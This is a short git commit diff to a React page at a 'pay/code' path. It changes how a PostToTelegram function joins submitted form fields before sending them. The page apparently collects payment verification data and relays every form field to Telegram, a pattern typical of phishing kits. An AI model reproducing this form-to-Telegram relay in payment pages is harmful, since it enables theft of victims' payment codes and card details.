af0ea48083f12a24ccdf5fe78087d24fcf50f6c7
Mhmd8998 <alnasrmhmd9988@gmail.com>
2024-12-17 17:04:51 +0300

    Update page.jsx

--- ‏‏my-app/src/app/fozajil/pay/code/page.jsx
+++ ‏‏my-app/src/app/fozajil/pay/code/page.jsx
@@ -28,7 +28,7 @@ const Code = () => {
   const PostToTelegram = () => {
     const description = Object.entries(form.data)
       .map((d) => `${d[0]} : ${d[1]} `)
-      .join("%0A");
+      .join("\n");
     Send(description)
 
     
